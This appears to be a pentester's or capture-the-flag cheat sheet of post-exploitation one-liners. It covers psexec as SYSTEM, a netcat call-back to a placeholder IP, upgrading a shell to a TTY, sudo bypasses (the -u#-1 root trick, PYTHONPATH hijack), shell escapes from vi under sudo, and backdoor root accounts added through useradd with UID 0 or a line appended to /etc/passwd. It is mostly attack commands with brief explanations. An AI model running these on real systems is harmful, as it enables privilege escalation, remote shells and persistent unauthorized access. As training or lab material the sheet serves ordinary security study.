# [psexec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec):
#### `psexec.exe -s -i cmd.exe`
#### `psexec.exe -s nc.exe X.X.X.X YYY`
#### `psexec.exe \\X.X.X.X -u <username> -p <password> -h cmd.exe`
  * -s runs the command as system
  * -i runs the commans interactively
  * -h runs the command with heightened privileges
  * -c copies the executable to the remote system

# [shell to TTY](https://netsec.ws/?p=337):
#### `python3 -c 'import pty; pty.spawn("/bin/sh")'`
#### `export TERM=screen`

# [sudo](https://linux.die.net/man/8/sudo):
#### `sudo -l`
#### `sudo -V`
#### `sudo PYTHONPATH=/path/to/current script.py`
#### `sudo -u#-1 <command>`
  * -l shows the allowed commands for the given user
  * -V shows the version
  * you can hijack an import and change the python path in the same command
  * -u#<number> attempts to run the command as a specific user id where both -1 maps to root. This specifically only bypasses a sudoers rule that allows users that are not root from running a command

# [useradd](https://linux.die.net/man/8/useradd):
#### `useradd -p $(openssl passwd -1 <password>) -g 0 -ou 0 -s /bin/sh <username>`
#### `echo '<username>:aa7JaDfeyG8m6:0:0:<username>:/root:/bin/bash' >> /etc/passwd`
#### `net localgroup Administrators <username> /add`
  * -g adds user to a group
  * -o allows user UID to be a duplicate of an existing one
  * -u adds the UID pf the user
  * if you can run a command as root, you can use the second example to create a root user with the password `gimme`
  * the last one is Windows

# [vi](https://linux.die.net/man/1/vi):
#### `sudo vi -c '!sh'`
#### `sudo vi test.sh` --> `:!bash`
#### `sudo vi ~/.ssh/authorized_keys`
  * -c runs a command
  * -x encrypt output
